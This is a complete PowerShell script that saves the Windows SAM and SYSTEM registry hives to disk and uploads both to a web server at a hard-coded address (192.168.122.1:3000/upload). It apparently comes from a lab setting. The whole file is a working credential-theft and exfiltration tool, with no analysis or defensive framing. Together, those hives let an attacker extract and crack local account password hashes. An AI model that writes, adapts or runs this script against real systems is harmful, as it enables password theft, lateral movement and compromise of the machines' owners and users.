# Path to export the SAM and SYSTEM hives
$samExportPath = "C:\Windows\System32\config\SAM_export"
$systemExportPath = "C:\Windows\System32\config\SYSTEM_export"

# URL of the webserver where we want to send the data
$url = "http://192.168.122.1:3000/upload"

# Function to extract SAM and SYSTEM hives and send them to the web server
function Export-And-Send-Hives {
    try {
        # Export the SAM and SYSTEM hives using the reg command in binary format
        reg save "HKLM\SAM" $samExportPath -y
        reg save "HKLM\SYSTEM" $systemExportPath -y
        
        # Read the content of the exported files
        $samContent = [System.IO.File]::ReadAllBytes($samExportPath)
        $systemContent = [System.IO.File]::ReadAllBytes($systemExportPath)
        
        # Send the content of SAM and SYSTEM hives to the specified web server
        Send-ContentToWebServer -SamData $samContent -SystemData $systemContent
    } 
    catch {
        Write-Host "Error exporting or sending hives: $_"
    }
}

# Function to send content to the web server
function Send-ContentToWebServer {
    param (
        [Parameter(Mandatory=$true)]
        [byte[]]$SamData,
        [Parameter(Mandatory=$true)]
        [byte[]]$SystemData
    )
    try {
        # Create a WebClient object
        $webClient = New-Object System.Net.WebClient
        
        # Upload the SAM data to the web server
        $samResponse = $webClient.UploadData($url, "POST", $SamData)
        
        # Check the SAM response
        if ([System.Text.Encoding]::UTF8.GetString($samResponse) -eq "200") {
            Write-Host "SAM data sent successfully to web server"
        } else {
            Write-Host "Failed to send SAM data to web server"
        }
        
        # Upload the SYSTEM data to the web server
        $systemResponse = $webClient.UploadData($url, "POST", $SystemData)
        
        # Check the SYSTEM response
        if ([System.Text.Encoding]::UTF8.GetString($systemResponse) -eq "200") {
            Write-Host "SYSTEM data sent successfully to web server"
        } else {
            Write-Host "Failed to send SYSTEM data to web server"
        }

        Write-Host "SAM data length: $($SamData.Length)"
        Write-Host "SYSTEM data length: $($SystemData.Length)"

    } 
    catch {
        Write-Host "Error sending data to web server: $_"
    }
}

# Call the function to export and send SAM and SYSTEM hives
Export-And-Send-Hives
